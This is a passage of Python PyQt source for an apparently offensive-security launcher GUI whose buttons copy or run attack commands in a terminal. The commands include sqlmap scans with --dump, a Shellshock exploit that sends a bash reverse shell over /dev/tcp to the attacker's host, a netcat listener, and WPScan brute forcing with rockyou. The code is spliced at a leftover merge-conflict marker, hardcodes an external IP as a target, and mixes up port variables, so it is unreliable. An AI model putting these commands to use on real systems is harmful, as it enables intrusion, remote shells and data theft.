        self.container_layout.addSpacerItem(spacer)
##############################################################################        
        SQLMap = QtWidgets.QLabel("[+ SQLMap]")
        SQLMap.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )
        self.container_layout.addWidget(SQLMap)
##############################################################################
        SQLMap_Scan1 = QtWidgets.QLabel(f"sqlmap -u http://{rhost}:{rport} --threads=2 --time-sec=10 --level=2 --risk=2 --technique=T --force-ssl")
        SQLMap_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
        )
        self.container_layout.addWidget(SQLMap_Scan1)
##############################################################################        
        copy_button = QPushButton()
        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(SQLMap_Scan1.text()))
        copy_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        self.container_layout.addLayout(label_layout)
###############################################################################        
        run_button = QPushButton()
        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
        run_button.setFixedSize(QSize(20,20))
        command30 = SQLMap_Scan1.text() + "; bash"
        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command30]))
        run_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(run_button)
        label_layout.addWidget(SQLMap_Scan1)
        self.container_layout.addLayout(label_layout)
#############################################################################      
        SQLMap_Scan2 = QtWidgets.QLabel(f"sqlmap -u http://{rhost}:{rport} --threads=2 --time-sec=10 --level=4 --risk=3 --dump")
        SQLMap_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
        )
        self.container_layout.addWidget(SQLMap_Scan2)
##############################################################################        
        copy_button = QPushButton()
        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(SQLMap_Scan2.text()))
        copy_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        self.container_layout.addLayout(label_layout)
###############################################################################        
        run_button = QPushButton()
        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
        run_button.setFixedSize(QSize(20,20))
        command31 = SQLMap_Scan2.text() + "; bash"
        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command31]))
        run_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(run_button)
        label_layout.addWidget(SQLMap_Scan2)
        self.container_layout.addLayout(label_layout)
#############################################################################      
        self.container_layout.addSpacerItem(spacer)
        self.container_layout.addSpacerItem(spacer)
        self.container_layout.addWidget(self.create_divider())
        self.container_layout.addWidget(self.create_divider())
        self.container_layout.addSpacerItem(spacer)
        self.container_layout.addSpacerItem(spacer)
##############################################################################        
        shellshockTest = QtWidgets.QLabel("[+ Test for Shell Shock]")
        shellshockTest.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )
        self.container_layout.addWidget(shellshockTest)
##############################################################################
        shellshockTest_Scan1 = QtWidgets.QLabel("curl -H 'User-Agent: () { :; }; echo \"VULNERABLE TO SHELLSHOCK\"' http://" + rhost + ":" + rport + "/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'")
        shellshockTest_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
        )
        self.container_layout.addWidget(shellshockTest_Scan1)
##############################################################################        
        copy_button = QPushButton()
        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(shellshockTest_Scan1.text()))
        copy_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        self.container_layout.addLayout(label_layout)
###############################################################################        
        run_button = QPushButton()
        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
        run_button.setFixedSize(QSize(20,20))
        command32 = shellshockTest_Scan1.text() + "; bash"
        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command32]))
        run_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(run_button)
        label_layout.addWidget(shellshockTest_Scan1)
        self.container_layout.addLayout(label_layout)
#############################################################################      
        self.container_layout.addSpacerItem(spacer)
#############################################################################      
        shellshockExploit = QtWidgets.QLabel("[+ Exploit Shell Shock]")
        shellshockExploit.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )
        self.container_layout.addWidget(shellshockExploit)
##############################################################################
        shellshockExploit_Scan1 = QtWidgets.QLabel(f"nc -nlvp {lport}")
        shellshockExploit_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
        )
        self.container_layout.addWidget(shellshockExploit_Scan1)
##############################################################################        
        copy_button = QPushButton()
        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(shellshockExploit_Scan1.text()))
        copy_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        self.container_layout.addLayout(label_layout)
###############################################################################        
        run_button = QPushButton()
        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
        run_button.setFixedSize(QSize(20,20))
        command33 = shellshockExploit_Scan1.text() + "; bash"
        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command33]))
        run_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(run_button)
        label_layout.addWidget(shellshockExploit_Scan1)
        self.container_layout.addLayout(label_layout)
#############################################################################      
        shellshockExploit_Scan2 = QtWidgets.QLabel("curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/" + self.lhost + "/" + lport + " 0>&1' http://" + rhost + ":" + rport + "/cgi-bin/admin.cgi")
        shellshockExploit_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
        )
        self.container_layout.addWidget(shellshockExploit_Scan2)
##############################################################################        
        copy_button = QPushButton()
        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(shellshockExploit_Scan2.text()))
        copy_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        self.container_layout.addLayout(label_layout)
###############################################################################        
        run_button = QPushButton()
        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
        run_button.setFixedSize(QSize(20,20))
        command34 = shellshockExploit_Scan2.text() + "; bash"
        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command34]))
        run_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(run_button)
        label_layout.addWidget(shellshockExploit_Scan2)
        self.container_layout.addLayout(label_layout)
#############################################################################      
        self.container_layout.addSpacerItem(spacer)
        self.container_layout.addSpacerItem(spacer)
        self.container_layout.addWidget(self.create_divider())
        self.container_layout.addWidget(self.create_divider())
        self.container_layout.addSpacerItem(spacer)
        self.container_layout.addSpacerItem(spacer)
        self.container_layout.addSpacerItem(spacer)

#### Passive Recon Section
    def PassiveRecon(self):
        self.lhost
        self.tab3.layout = QVBoxLayout()
        self.scroll = QScrollArea()
        self.container = QWidget()
        self.container_layout = QVBoxLayout(self.container)
        self.container.setLayout(self.container_layout)
        self.scroll.setWidget(self.container)
        self.scroll.setWidgetResizable(True)
        self.container.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
        self.scroll.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOn)
        self.container_layout.setContentsMargins(0,0,0,0)
        self.container.adjustSize()
        spacer = QSpacerItem(0, 25)
        divider = self.create_divider()
        self.tab3.layout.addWidget(self.scroll)
        self.tab3.setLayout(self.tab3.layout)
##### Censys Section Title
        censys = QtWidgets.QLabel("[+ Censys]")
        censys.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )
        self.container_layout.addWidget(censys)
#### Temp Port assignment
        rhost = "216.55.143.82"
        rport = "80"
#### Censys Port Scan on IP
        censys_Scan1 = QtWidgets.QLabel(f"")
        censys_Scan1 = QtWidgets.QLabel(f"censys search {rhost} | grep -Ew \"ip|port\"")
        censys_Scan1.setStyleSheet(
=======
        self.tab1_container_layout.insertWidget(0,self.nmap)

        # nmap Scan1
        if hasattr(self, 'nmap_Scan1'):
            self.tab1_container_layout.removeWidget(self.nmap_Scan1)
            self.nmap_Scan1.deleteLater()
        self.nmap_Scan1 = QLabel(f"nmap -p- -sT -sV -A  {self.lhost}")
        self.nmap_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # nmap_Scan1 copy button
        if hasattr(self, 'nmap_Scan1_Copy'):
            self.tab1_container_layout.removeWidget(self.nmap_Scan1_Copy)
            self.nmap_Scan1_Copy.deleteLater()
        self.nmap_Scan1_Copy = QPushButton()
        self.nmap_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.nmap_Scan1_Copy.setFixedSize(QSize(20,20))
        self.nmap_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.nmap_Scan1.text()))
        self.nmap_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # nmap_Scan1 run button
        if hasattr(self, 'nmap_Scan1_Run'):
            self.tab1_container_layout.removeWidget(self.nmap_Scan1_Run)
            self.nmap_Scan1_Run.deleteLater()
        self.nmap_Scan1_Run = QPushButton()
        self.nmap_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.nmap_Scan1_Run.setFixedSize(QSize(20,20))
        command1 = self.nmap_Scan1.text() + "; bash"
        self.nmap_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command1]))
        self.nmap_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # nmap_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.nmap_Scan1_Copy)
        label_layout.addWidget(self.nmap_Scan1_Run)
        label_layout.addWidget(self.nmap_Scan1)
        self.tab1_container_layout.insertLayout(1, label_layout)
        self.tab1_container_layout.addStretch()

        # nmap Scan2
        if hasattr(self, 'nmap_Scan2'):
            self.tab1_container_layout.removeWidget(self.nmap_Scan2)
            self.nmap_Scan2.deleteLater()
        self.nmap_Scan2 = QLabel(f"nmap -p- -sC -sV {self.rhost} --open") 
        self.nmap_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # nmap_Scan2 copy button
        if hasattr(self, 'nmap_Scan2_Copy'):
            self.tab1_container_layout.removeWidget(self.nmap_Scan2_Copy)
            self.nmap_Scan2_Copy.deleteLater()
        self.nmap_Scan2_Copy = QPushButton()
        self.nmap_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.nmap_Scan2_Copy.setFixedSize(QSize(20,20))
        self.nmap_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.nmap_Scan2.text()))
        self.nmap_Scan2_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # nmap_Scan2 run button
        if hasattr(self, 'nmap_Scan2_Run'):
            self.tab1_container_layout.removeWidget(self.nmap_Scan2_Run)
            self.nmap_Scan2_Run.deleteLater()
        self.nmap_Scan2_Run = QPushButton()
        self.nmap_Scan2_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.nmap_Scan2_Run.setFixedSize(QSize(20,20))
        command1 = self.nmap_Scan2.text() + "; bash"
        self.nmap_Scan2_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command1]))
        self.nmap_Scan2_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # nmap_Scan2 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.nmap_Scan2_Copy)
        label_layout.addWidget(self.nmap_Scan2_Run)
        label_layout.addWidget(self.nmap_Scan2)
        self.tab1_container_layout.insertLayout(2, label_layout)
        self.tab1_container_layout.addStretch()
        
        # nmap Scan3
        if hasattr(self, 'nmap_Scan3'):
            self.tab1_container_layout.removeWidget(self.nmap_Scan3)
            self.nmap_Scan3.deleteLater()
        self.nmap_Scan3 = QLabel(f"nmap -p- --script=vuln {self.rhost}")
        self.nmap_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # nmap copy button
        if hasattr(self, 'nmap_Scan3_Copy'):
            self.tab1_container_layout.removeWidget(self.nmap_Scan3_Copy)
            self.nmap_Scan3_Copy.deleteLater()
        self.nmap_Scan3_Copy = QPushButton()
        self.nmap_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.nmap_Scan3_Copy.setFixedSize(QSize(20,20))
        self.nmap_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.nmap_Scan3.text()))
        self.nmap_Scan3_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # nmap run button
        if hasattr(self, 'nmap_Scan3_Run'):
            self.tab1_container_layout.removeWidget(self.nmap_Scan3_Run)
            self.nmap_Scan3_Run.deleteLater()
        self.nmap_Scan3_Run = QPushButton()
        self.nmap_Scan3_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.nmap_Scan3_Run.setFixedSize(QSize(20,20))
        command1 = self.nmap_Scan3.text() + "; bash"
        self.nmap_Scan3_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command1]))
        self.nmap_Scan3_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # nmap_Scan3 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.nmap_Scan3_Copy)
        label_layout.addWidget(self.nmap_Scan3_Run)
        label_layout.addWidget(self.nmap_Scan3)
        self.tab1_container_layout.insertLayout(3, label_layout)
        self.tab1_container_layout.addStretch()
        
        # nmap divider 1
        if hasattr(self, 'nmap_divider1'):
            self.tab1_container_layout.removeWidget(self.nmap_divider1)
            self.nmap_divider1.deleteLater()
        self.nmap_divider1 = QFrame()
        self.nmap_divider1.setFrameShape(QFrame.HLine)
        self.nmap_divider1.setLineWidth(3)
        self.nmap_divider1.setStyleSheet("color: #20C20E;")
        
        # nmap divider2
        if hasattr(self, 'nmap_divider2'):
            self.tab1_container_layout.removeWidget(self.nmap_divider2)
            self.nmap_divider2.deleteLater()
        self.nmap_divider2 = QFrame()
        self.nmap_divider2.setFrameShape(QFrame.HLine)
        self.nmap_divider2.setLineWidth(3)
        self.nmap_divider2.setStyleSheet("color: #20C20E;")
        
        # nmap spacer1
        if hasattr(self, 'nmap_spacer1'):
            self.tab1_container_layout.removeWidget(self.nmap_spacer1)
            self.nmap_spacer1.deleteLater()
        self.nmap_spacer1 = QLabel()
        self.nmap_spacer1.setFixedWidth(40)
        self.nmap_spacer1.setFixedHeight(50)
        
        # nmap spacer2
        if hasattr(self, 'nmap_spacer2'):
            self.tab1_container_layout.removeWidget(self.nmap_spacer2)
            self.nmap_spacer2.deleteLater()
        self.nmap_spacer2 = QLabel()
        self.nmap_spacer2.setFixedWidth(40)
        self.nmap_spacer2.setFixedHeight(50)

        # nmap spacer & divider layout
        self.tab1_container_layout.insertWidget(4, self.nmap_spacer1)
        self.tab1_container_layout.insertWidget(5, self.nmap_divider1)
        self.tab1_container_layout.insertWidget(6, self.nmap_divider2)
        self.tab1_container_layout.insertWidget(7, self.nmap_spacer2)

### HTTPHelper
    def httphelper(self):
        self.lport = "80"
        self.rport = "4444"
        self.rhost = "127.0.0.1"
        if not hasattr(self, 'tab2_container'):
            self.tab2_container = QWidget()
            self.tab2_container_layout = QVBoxLayout(self.tab2_container)
            self.tab2_container.setLayout(self.tab2_container_layout)
            self.scroll = QScrollArea()
            self.scroll.setWidget(self.tab2_container)
            self.scroll.setWidgetResizable(True)
            self.tab2_container.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
            self.scroll.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOn)
            self.tab2_container_layout.setContentsMargins(0,0,0,0)
            self.tab2_container.adjustSize()
            
            self.tab2.setLayout(QVBoxLayout())
            self.tab2.layout().addWidget(self.scroll)

        # nmap_methods
        if hasattr(self, 'nmap_methods'):
            self.tab2_container_layout.removeWidget(self.nmap_methods)
            self.nmap_methods.deleteLater()
        self.nmap_methods = QLabel("[+ Nmap HTTP Methods]")
        self.nmap_methods.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab2_container_layout.insertWidget(0,self.nmap_methods)
        self.tab2_container_layout.addStretch()
        
        if hasattr(self, 'nmapMethods_Scan1'):
            self.tab2_container_layout.removeWidget(self.nmapMethods_Scan1)
            self.nmapMethods_Scan1.deleteLater()
        self.nmapMethods_Scan1 = QLabel("nmap --script http-methods --script-args http-methods.url-path='/website'")
        self.nmapMethods_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )

        # nmapMethods_Scan1 copy button
        if hasattr(self, 'nmapMethods_Scan1_Copy'):
            self.tab2_container_layout.removeWidget(self.nmapMethods_Scan1_Copy)
            self.nmapMethods_Scan1_Copy.deleteLater()
        self.nmapMethods_Scan1_Copy = QPushButton()
        self.nmapMethods_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.nmapMethods_Scan1_Copy.setFixedSize(QSize(20,20))
        self.nmapMethods_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.nmapMethods_Scan1.text()))
        self.nmapMethods_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # nmapMethods_Scan1 run button
        if hasattr(self, 'nmapMethods_Scan1_Run'):
            self.tab2_container_layout.removeWidget(self.nmapMethods_Scan1_Run)
            self.nmapMethods_Scan1_Run.deleteLater()
        self.nmapMethods_Scan1_Run = QPushButton()
        self.nmapMethods_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.nmapMethods_Scan1_Run.setFixedSize(QSize(20,20))
        command4 = self.nmapMethods_Scan1.text() + "; bash"
        self.nmapMethods_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command4]))
        self.nmapMethods_Scan1_Run.setStyleSheet(
        "*:hover{background: '#20C20e';}"
        )
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.nmapMethods_Scan1_Copy)
        label_layout.addWidget(self.nmapMethods_Scan1_Run)
        label_layout.addWidget(self.nmapMethods_Scan1)
        self.tab2_container_layout.insertLayout(1, label_layout)
        self.tab2_container_layout.addStretch()

        # nmap Methods Scan2
        if hasattr(self, 'nmapMethods_Scan2'):
            self.tab2_container_layout.removeWidget(self.nmapMethods_Scan2)
            self.nmapMethods_Scan2.deleteLater()
        self.nmapMethods_Scan2 = QLabel("nmap --script smb-enum-shares")
        self.nmapMethods_Scan2.setStyleSheet(
        "color: 'white';" +
        "font-size: 20px;" +
        "font-style: 'bold';"
        )
        # nmapMethods_Scan2 copy button
        if hasattr(self, 'nmapMethods_Scan2_Copy'):
            self.tab2_container_layout.removeWidget(self.nmapMethods_Scan2_Copy)
            self.nmapMethods_Scan2_Copy.deleteLater()
        self.nmapMethods_Scan2_Copy = QPushButton()
        self.nmapMethods_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.nmapMethods_Scan2_Copy.setFixedSize(QSize(20,20))
        self.nmapMethods_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.nmapMethods_Scan2.text()))
        self.nmapMethods_Scan2_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # nmapMethods_Scan2 run button
        if hasattr(self, 'nmapMethods_Scan2_Run'):
            self.tab2_container_layout.removeWidget(self.nmapMethods_Scan2_Run)
            self.nmapMethods_Scan2_Run.deleteLater()
        self.nmapMethods_Scan2_Run = QPushButton()
        self.nmapMethods_Scan2_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.nmapMethods_Scan2_Run.setFixedSize(QSize(20,20))
        command5 = self.nmapMethods_Scan2.text() + "; bash"
        self.nmapMethods_Scan2_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command5]))
        self.nmapMethods_Scan2_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # nmapMethods_Scan2 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.nmapMethods_Scan2_Copy)
        label_layout.addWidget(self.nmapMethods_Scan2_Run)
        label_layout.addWidget(self.nmapMethods_Scan2)
        self.tab2_container_layout.insertLayout(2, label_layout)
   
        # nmapMethods_Scan3
        if hasattr(self, 'nmapMethods_Scan3'):
            self.tab2_container_layout.removeWidget(self.nmapMethods_Scan3)
            self.nmapMethods_Scan3.deleteLater()
        self.nmapMethods_Scan3 = QLabel("nmap -p80,443 --script=http-methods --script-args http-methods.url-path='/website'")
        self.nmapMethods_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # nmapMethods_Scan3 copy button
        if hasattr(self, 'nmapMethods_Scan3_Copy'):
            self.tab2_container_layout.removeWidget(self.nmapMethods_Scan3_Copy)
            self.nmapMethods_Scan3_Copy.deleteLater()
        self.nmapMethods_Scan3_Copy = QPushButton()
        self.nmapMethods_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.nmapMethods_Scan3_Copy.setFixedSize(QSize(20,20))
        self.nmapMethods_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.nmapMethods_Scan3.text()))
        self.nmapMethods_Scan3_Copy.setStyleSheet("*:hover{background: '#20C20e';}")
        
        # nmapMethods_Scan3 run button
        if hasattr(self, 'nmapMethods_Scan3_Run'):
            self.tab2_container_layout.removeWidget(self.nmapMethods_Scan3_Run)
            self.nmapMethods_Scan3_Run.deleteLater()
        self.nmapMethods_Scan3_Run = QPushButton()
        self.nmapMethods_Scan3_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.nmapMethods_Scan3_Run.setFixedSize(QSize(20,20))
        command6 = self.nmapMethods_Scan3.text() + "; bash"
        self.nmapMethods_Scan3_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command6]))
        self.nmapMethods_Scan3_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # nmapMethods_Scan3 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.nmapMethods_Scan3_Copy)
        label_layout.addWidget(self.nmapMethods_Scan3_Run)
        label_layout.addWidget(self.nmapMethods_Scan3)
        self.tab2_container_layout.insertLayout(3, label_layout)
        self.tab2_container_layout.addStretch()

        # httpMethods_divider 1
        if hasattr(self, 'httpMethods_divider1'):
            self.tab2_container_layout.removeWidget(self.httpMethods_divider1)
            self.httpMethods_divider1.deleteLater()
        self.httpMethods_divider1 = QFrame()
        self.httpMethods_divider1.setFrameShape(QFrame.HLine)
        self.httpMethods_divider1.setLineWidth(3)
        self.httpMethods_divider1.setStyleSheet("color: #20C20E;")
        
        # httpMethods_divider2
        if hasattr(self, 'httpMethods_divider2'):
            self.tab2_container_layout.removeWidget(self.httpMethods_divider2)
            self.httpMethods_divider2.deleteLater()
        self.httpMethods_divider2 = QFrame()
        self.httpMethods_divider2.setFrameShape(QFrame.HLine)
        self.httpMethods_divider2.setLineWidth(3)
        self.httpMethods_divider2.setStyleSheet("color: #20C20E;")
        
        # httpMethods_spacer1
        if hasattr(self, 'httpMethods_spacer1'):
            self.tab2_container_layout.removeWidget(self.httpMethods_spacer1)
            self.httpMethods_spacer1.deleteLater()
        self.httpMethods_spacer1 = QLabel()
        self.httpMethods_spacer1.setFixedWidth(40)
        self.httpMethods_spacer1.setFixedHeight(50)
        
        # httpMethods_spacer2
        if hasattr(self, 'httpMethods_spacer2'):
            self.tab2_container_layout.removeWidget(self.httpMethods_spacer2)
            self.httpMethods_spacer2.deleteLater()
        self.httpMethods_spacer2 = QLabel()
        self.httpMethods_spacer2.setFixedWidth(40)
        self.httpMethods_spacer2.setFixedHeight(50)

        # httpMethods_spacer & divider layout
        self.tab2_container_layout.insertWidget(4, self.httpMethods_spacer1)
        self.tab2_container_layout.insertWidget(5, self.httpMethods_divider1)
        self.tab2_container_layout.insertWidget(6, self.httpMethods_divider2)
        self.tab2_container_layout.insertWidget(7, self.httpMethods_spacer2)
        self.tab2_container_layout.addStretch()
        
# WPScanSSL
        if hasattr(self, 'wpscanSSL'):
            self.tab2_container_layout.removeWidget(self.wpscanSSL)
            self.wpscanSSL.deleteLater()
        self.wpscanSSL = QLabel("[+ WPScan & SSL]")
        self.wpscanSSL.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab2_container_layout.insertWidget(8,self.wpscanSSL)

        # wpscanSSL Scan1
        if hasattr(self, 'wpscanSSL_Scan1'):
            self.tab2_container_layout.removeWidget(self.wpscanSSL_Scan1)
            self.wpscanSSL_Scan1.deleteLater()
        self.wpscanSSL_Scan1 = QLabel(f"wpscan --url http://{self.lhost}:{self.lport} --disable-tls-checks --enumerate p --enumerate t --enumerate u")
        self.wpscanSSL_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # wpscanSSL_Scan1 copy button
        if hasattr(self, 'wpscanSSL_Scan1_Copy'):
            self.tab2_container_layout.removeWidget(self.wpscanSSL_Scan1_Copy)
            self.wpscanSSL_Scan1_Copy.deleteLater()
        self.wpscanSSL_Scan1_Copy = QPushButton()
        self.wpscanSSL_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpscanSSL_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wpscanSSL_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpscanSSL_Scan1.text()))
        self.wpscanSSL_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wpscanSSL_Scan1 run button
        if hasattr(self, 'wpscanSSL_Scan1_Run'):
            self.tab2_container_layout.removeWidget(self.wpscanSSL_Scan1_Run)
            self.wpscanSSL_Scan1_Run.deleteLater()
        self.wpscanSSL_Scan1_Run = QPushButton()
        self.wpscanSSL_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.wpscanSSL_Scan1_Run.setFixedSize(QSize(20,20))
        command1 = self.wpscanSSL_Scan1.text() + "; bash"
        self.wpscanSSL_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command1]))
        self.wpscanSSL_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wpscanSSL_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpscanSSL_Scan1_Copy)
        label_layout.addWidget(self.wpscanSSL_Scan1_Run)
        label_layout.addWidget(self.wpscanSSL_Scan1)
        self.tab2_container_layout.insertLayout(9, label_layout)
        self.tab2_container_layout.addStretch()

        # wpscanSSL_spacer1
        if hasattr(self, 'wpscanSSL_spacer1'):
            self.tab2_container_layout.removeWidget(self.wpscanSSL_spacer1)
            self.wpscanSSL_spacer1.deleteLater()
        self.wpscanSSL_spacer1 = QLabel()
        self.wpscanSSL_spacer1.setFixedWidth(40)
        self.wpscanSSL_spacer1.setFixedHeight(20)

        # wpscanSSL_spacer & divider layout
        self.tab2_container_layout.insertWidget(10, self.wpscanSSL_spacer1)

# wpscanBF
        if hasattr(self, 'wpscanBF'):
            self.tab2_container_layout.removeWidget(self.wpscanBF)
            self.wpscanBF.deleteLater()
        self.wpscanBF = QLabel("[+ WPScan Brute Forcing:]")
        self.wpscanBF.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab2_container_layout.insertWidget(11,self.wpscanBF)

        # wpscanBF_Scan1
        if hasattr(self, 'wpscanBF_Scan1'):
            self.tab2_container_layout.removeWidget(self.wpscanBF_Scan1)
            self.wpscanBF_Scan1.deleteLater()
        self.wpscanBF_Scan1 = QLabel(f"wpscan --url http://{self.lhost}:{self.lport} --disable-tls-checks -U users -P /usr/share/wordlists/rockyou.txt")
        self.wpscanBF_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # wpscanBF_Scan1 copy button
        if hasattr(self, 'wpscanBF_Scan1_Copy'):
            self.tab2_container_layout.removeWidget(self.wpscanBF_Scan1_Copy)
            self.wpscanBF_Scan1_Copy.deleteLater()
        self.wpscanBF_Scan1_Copy = QPushButton()
        self.wpscanBF_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpscanBF_Scan1_Copy.setFixedSize(QSize(20,20))
